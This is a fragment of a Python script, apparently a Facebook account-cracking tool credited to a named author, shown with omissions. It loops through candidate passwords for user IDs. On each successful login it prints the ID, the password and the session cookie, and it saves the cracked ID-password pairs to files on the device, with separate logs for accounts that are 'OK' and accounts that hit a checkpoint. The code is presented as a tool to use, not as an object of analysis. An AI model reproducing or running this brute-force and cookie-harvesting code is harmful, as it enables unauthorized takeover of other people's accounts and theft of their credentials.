#Programmer: Arafat Bin Mahin 
# Facebook: Arafat Mahin 
# Github: arafatmahin310
...
ha = current.day
today = date.today()
os.system('https://www.facebook.com/100000545457649/posts/1241785529761381/?substory_index=1241785529761381&app=fbl/')
logo = ("""
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[Demon-Mahin-OK💉] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎❤]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Demon-Mahin-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[Demon-Mahin-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/Demon-Mahin-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}Demon-Mahin{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
